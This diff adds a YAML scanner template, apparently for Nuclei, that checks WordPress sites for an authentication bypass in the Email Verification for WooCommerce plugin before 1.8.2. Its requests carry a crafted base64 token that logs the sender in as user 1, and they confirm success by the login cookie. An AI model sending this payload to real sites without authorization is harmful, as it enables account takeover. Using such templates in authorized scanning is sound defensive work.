@@ -1,0 +1,30 @@
+id: wp-woocommerce-email-verification
+info:
+  author: random_robbie,daffianfo
+  name: Email Verification for WooCommerce < 1.8.2 - Loose Comparison to Authentication
+    Bypass
+  reference:
+  - https://wpvulndb.com/vulnerabilities/10318
+  severity: critical
+  tags: wordpress,wp-plugin,woocommerce
+requests:
+- matchers:
+  - part: header
+    regex:
+    - wordpress_logged_in_[a-z0-9]{32}
+    type: regex
+  - condition: and
+    part: body
+    type: word
+    words:
+    - Your account has been activated!
+    - From your account dashboard you can view your
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0='
+  - '{{BaseURL}}/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0='
+  stop-at-first-match: true
